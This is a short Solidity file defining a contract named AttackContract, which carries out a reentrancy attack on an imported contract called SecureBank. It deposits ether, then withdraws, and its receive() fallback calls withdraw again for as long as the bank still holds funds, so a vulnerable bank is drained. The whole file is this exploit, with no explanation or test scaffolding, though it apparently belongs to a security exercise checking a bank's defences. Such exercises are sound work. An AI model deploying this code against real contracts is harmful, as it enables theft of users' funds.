// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {SecureBank} from "./secureBank.sol";

contract AttackContract {
    SecureBank public bank;

    constructor(address _bank) {
        bank = SecureBank(_bank);
    }

    function attack() public payable {
        bank.deposit{value: msg.value}();
        bank.withdraw(msg.value);
    }

    receive() external payable {
        if (address(bank).balance >= msg.value) {
            bank.withdraw(msg.value);
        }
    }
}
